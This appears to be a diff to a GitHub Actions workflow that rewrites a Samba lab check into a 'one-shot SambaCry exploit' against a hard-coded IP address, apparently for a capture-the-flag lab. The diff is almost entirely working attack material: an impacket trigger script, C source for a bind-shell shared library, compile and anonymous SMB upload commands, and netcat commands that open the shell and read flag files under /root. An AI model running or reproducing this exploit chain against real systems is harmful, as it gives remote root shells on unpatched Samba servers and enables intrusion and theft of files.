@@ -12,7 +12,7 @@ permissions:
 jobs:
   run:
     runs-on: ubuntu-latest
-    timeout-minutes: 20
+    timeout-minutes: 10
     steps:
       - uses: actions/checkout@v4
 
@@ -23,42 +23,31 @@ jobs:
           sudo apt-get install -y smbclient netcat-openbsd gcc python3-pip
           python3 -m pip install --user impacket
 
-      - name: Run SambaCry lab check
+      - name: One-shot SambaCry exploit
         run: |
-          set -euxo pipefail
+          set -uxo pipefail
           TARGET="34.21.201.155"
           OUT="secplayground-result.txt"
           : > "$OUT"
-          {
-            echo "Target: $TARGET"
-            date -u
-            echo
-            echo "TCP reachability:"
-            for p in 445 4444 4445 6699; do
-              nc -vz -w 8 "$TARGET" "$p" || true
-            done
-            echo
-          } | tee -a "$OUT"
+          exec > >(tee -a "$OUT") 2>&1
+          date -u
+          echo "Target: $TARGET"
+          nc -vz -w 8 "$TARGET" 445 || true
+          smbclient -L "//$TARGET/" -N -g || true
 
           cat > exploit.py <<'PY'
           from optparse import OptionParser
           from impacket.dcerpc.v5 import transport
-
           parser = OptionParser()
           parser.add_option("-t", "--target", dest="target")
           parser.add_option("-m", "--module", dest="module")
           options, _ = parser.parse_args()
-          if not options.target or not options.module:
-              parser.print_help()
-              raise SystemExit(2)
           stringbinding = r'ncacn_np:%s[\pipe\%s]' % (options.target, options.module)
-          rpctransport = transport.DCERPCTransportFactory(stringbinding)
-          dce = rpctransport.get_dce_rpc()
+          dce = transport.DCERPCTransportFactory(stringbinding).get_dce_rpc()
           dce.connect()
           PY
 
           cat > bindshell-samba.c <<'C'
-          #include <stdio.h>
           #include <stdlib.h>
           #include <netinet/in.h>
           #include <sys/types.h>
@@ -68,100 +57,49 @@ jobs:
           #ifndef BIND_PORT
           #define BIND_PORT 4444
           #endif
-          static void detachFromParent(void) {
-            pid_t pid, sid;
+          static void detach(void) {
+            pid_t pid;
             if (getppid() == 1) return;
             pid = fork();
             if (pid < 0) exit(1);
             if (pid > 0) exit(0);
             umask(0);
-            sid = setsid();
-            if (sid < 0) exit(1);
-            if (chdir("/") < 0) exit(1);
+            setsid();
+            chdir("/");
           }
           int samba_init_module(void) {
-            detachFromParent();
-            int hostSocket, clientSocket;
-            struct sockaddr_in hostAddr;
+            detach();
+            int s, c;
+            struct sockaddr_in a;
             char *argv[] = {"/bin/sh", "-i", NULL};
-            hostSocket = socket(PF_INET, SOCK_STREAM, 0);
-            hostAddr.sin_family = AF_INET;
-            hostAddr.sin_port = htons(BIND_PORT);
-            hostAddr.sin_addr.s_addr = htonl(INADDR_ANY);
-            bind(hostSocket, (struct sockaddr*) &hostAddr, sizeof(hostAddr));
-            listen(hostSocket, 2);
-            clientSocket = accept(hostSocket, NULL, NULL);
-            dup2(clientSocket, 0);
-            dup2(clientSocket, 1);
-            dup2(clientSocket, 2);
+            s = socket(PF_INET, SOCK_STREAM, 0);
+            a.sin_family = AF_INET;
+            a.sin_port = htons(BIND_PORT);
+            a.sin_addr.s_addr = htonl(INADDR_ANY);
+            bind(s, (struct sockaddr*) &a, sizeof(a));
+            listen(s, 2);
+            c = accept(s, NULL, NULL);
+            dup2(c, 0);
+            dup2(c, 1);
+            dup2(c, 2);
             execve("/bin/sh", argv, NULL);
-            close(hostSocket);
             return 0;
           }
           C
 
           gcc -shared -fPIC -DBIND_PORT=4444 -o libspg4444.so bindshell-samba.c
           gcc -shared -fPIC -DBIND_PORT=4445 -o libspg4445.so bindshell-samba.c
+          smbclient "//$TARGET/share" -N -c "put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls" || true
 
-          echo "SMB shares:" | tee -a "$OUT"
-          smbclient -L "//$TARGET/" -N -g 2>&1 | tee -a "$OUT" || true
-
-          python3 - <<'PY' > shares.txt
-          import subprocess, re
-          target = "34.21.201.155"
-          p = subprocess.run(["smbclient", "-L", f"//{target}/", "-N", "-g"], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-          shares = []
-          for line in p.stdout.splitlines():
-              parts = line.split("|")
-              if len(parts) >= 2 and parts[0] == "Disk":
-                  name = parts[1].strip()
-                  if name and name not in ("print$", "IPC$"):
-                      shares.append(name)
-          print("\n".join(shares))
-          PY
-
-          if [ ! -s shares.txt ]; then
-            echo "No disk shares found." | tee -a "$OUT"
-          fi
-
-          direct_dirs="/tmp /mnt /share /home/share /home/mnt /srv/share /srv/samba/share /var/samba/share /var/lib/samba/share /tmp/share /var/tmp/share /data/share /shared /media/share /mnt/share /opt/share /samba/share /usr/local/samba/var/share"
-          bases="/tmp /var/tmp /shared /share /shares /srv /srv/samba /var/samba /var/lib/samba /home /home/samba /mnt /mnt/usb /media /data /volume1 /volume2 /volume3 /opt /usr/local/samba/var"
-          for share in $(cat shares.txt); do
-            echo "Testing share: $share" | tee -a "$OUT"
-            for so in libspg4444.so libspg4445.so; do
-              smbclient "//$TARGET/$share" -N -c "put $so $so; ls" 2>&1 | tee -a "$OUT" || true
-            done
-            for dir in $direct_dirs; do
-              for so in libspg4444.so libspg4445.so; do
-                module="$dir/$so"
-                echo "Trigger $module" | tee -a "$OUT"
-                python3 exploit.py -t "$TARGET" -m "$module" 2>&1 | tee -a "$OUT" || true
-                sleep 1
-                for bp in 4444 4445; do
-                  printf 'id; hostname; ls -la /root; for f in /root/flag* /root/*flag*; do echo ===$f===; cat "$f"; done; exit\n' \
-                    | nc -w 6 "$TARGET" "$bp" 2>&1 | tee -a "$OUT" || true
-                done
-                if grep -Eiq 'flag|cve\{|sec\{|samba\{|uid=' "$OUT"; then
-                  echo "Potential result found." | tee -a "$OUT"
-                  exit 0
-                fi
-              done
-            done
-            for base in $bases; do
-              for so in libspg4444.so libspg4445.so; do
-                module="$base/$share/$so"
-                echo "Trigger $module" | tee -a "$OUT"
-                python3 exploit.py -t "$TARGET" -m "$module" 2>&1 | tee -a "$OUT" || true
-                sleep 1
-                for bp in 4444 4445; do
-                  printf 'id; hostname; ls -la /root; for f in /root/flag* /root/*flag*; do echo ===$f===; cat "$f"; done; exit\n' \
-                    | nc -w 6 "$TARGET" "$bp" 2>&1 | tee -a "$OUT" || true
-                done
-                if grep -Eiq 'flag|cve\\{|sec\\{|samba\\{|uid=' "$OUT"; then
-                  echo "Potential result found." | tee -a "$OUT"
-                  exit 0
-                fi
-              done
+          for n in 1 2 3; do
+            echo "Trigger round $n /tmp/libspg4444.so"
+            python3 exploit.py -t "$TARGET" -m /tmp/libspg4444.so || true
+            echo "Trigger round $n /tmp/libspg4445.so"
+            python3 exploit.py -t "$TARGET" -m /tmp/libspg4445.so || true
+            sleep 2
+            for p in 4444 4445 6699; do
+              echo "Connect bind shell $p"
+              printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n' | nc -w 8 "$TARGET" "$p" || true
             done
           done
 
